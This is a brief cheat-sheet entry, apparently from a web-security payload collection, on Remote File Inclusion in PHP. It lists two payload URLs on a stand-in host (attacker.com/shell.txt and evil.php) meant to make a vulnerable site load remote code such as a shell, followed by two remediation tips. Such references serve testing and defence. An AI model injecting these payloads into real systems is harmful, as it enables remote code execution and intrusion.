# Remote File Inclusion

## Summary
Include remote files via LFI/RFI.

## Payloads

```
http://attacker.com/shell.txt
https://attacker.com/evil.php
```

## Remediation
- Disable allow_url_include (PHP)
- Whitelist allowed include paths
